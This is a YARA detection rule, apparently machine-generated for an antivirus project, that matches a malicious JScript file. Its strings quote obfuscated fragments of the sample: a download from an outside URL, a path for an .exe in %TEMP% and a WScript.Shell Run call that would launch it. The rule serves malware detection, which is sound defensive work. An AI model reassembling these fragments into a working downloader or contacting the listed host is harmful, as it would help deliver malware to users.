rule sig_20160328_ca46bfbf91e3dba9ae29825800050ed0 {
  meta:
    description = "datamaliciousorder - file 20160328_ca46bfbf91e3dba9ae29825800050ed0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ea01940729c9bf582a7ba79f3cf369e81189668f3af2531fff062aae8226ea83"

  strings:
    $s1  = "function Xzneamjax() {return Fttziqazzb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iGNRZQl54Xt.exe\";};" fullword ascii
    $s2  = "Ifvdxevh[Pwyvn](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Tglinr](Arqrs() * 11)} while (Ifvdxevh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Afunfflusu(Oilgtfrlv, Rnryeqbv){return Oilgtfrlv - Rnryeqbv;};" fullword ascii
    $s5  = "var Fttziqazzb = function Kvzfnywxui() {return WScript[Qbelmwt](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zoems() {return ((Ctyoxs == true) && (Ctyoxs == Lackysys)) ? 1 : Pkyqslwo;};" fullword ascii
    $s7  = "function Dmyhzb(Mmsrvf){Fttziqazzb[\"Run\"](Mmsrvf, Pkyqslwo, Pkyqslwo);};" fullword ascii
    $s8  = " while (Plbzcva){" fullword ascii
    $s9  = "var Ctyoxs = false;" fullword ascii
    $s10 = "var Wzsmkcve = new this[\"Date\"]();" fullword ascii
    $s11 = "var Owgkukvfkz = false;" fullword ascii
    $s12 = "Lackysys = true; " fullword ascii
    $s13 = "function Xppfrm()" fullword ascii
    $s14 = "function Afcjq(){return Qpyoynh;};" fullword ascii
    $s15 = "function Arqrs(){return 22;};" fullword ascii
    $s16 = "function Ulrtuvnfcx(){return Qbelmwt;};" fullword ascii
    $s17 = "Ctyoxs = true; " fullword ascii
    $s18 = "function Dehezaewwi(Rvncwekn) {var Tnymothtzj = (1, 2, 3, 4, 5, Rvncwekn); return Tnymothtzj;};" fullword ascii
    $s19 = "var Lackysys = false;" fullword ascii
    $s20 = "} catch(Wdwrrek){Plbzcva = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}